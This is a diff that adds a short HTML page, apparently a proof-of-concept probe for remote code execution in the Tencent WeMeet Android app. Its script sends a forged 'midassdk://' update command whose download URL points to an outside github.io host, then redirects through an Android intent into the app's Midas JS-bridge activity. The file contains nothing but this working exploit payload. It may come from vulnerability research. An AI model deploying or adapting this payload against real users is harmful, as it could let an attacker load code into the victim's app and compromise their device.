@@ -1,0 +1,13 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P22X5</title></head>
+<body><h1>P22X5</h1>
+<script>
+document.title='P22X5-START';
+try {
+  alert('midassdk://{"action":"update","data":[{"name":"MidasPay","update_md5":"deadbeefdeadbeefdeadbeefdeadbeef","full_download_url":"https://gitwhs.github.io/wm-poc-rce/probe22tb.html"}]}');
+} catch (e) {}
+setTimeout(function(){
+  location.href='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.jsbridge.APWebJSBridgeActivity;S.key_pure_h5_pay=value_pure_h5_pay;end';
+}, 800);
+</script>
+</body></html>
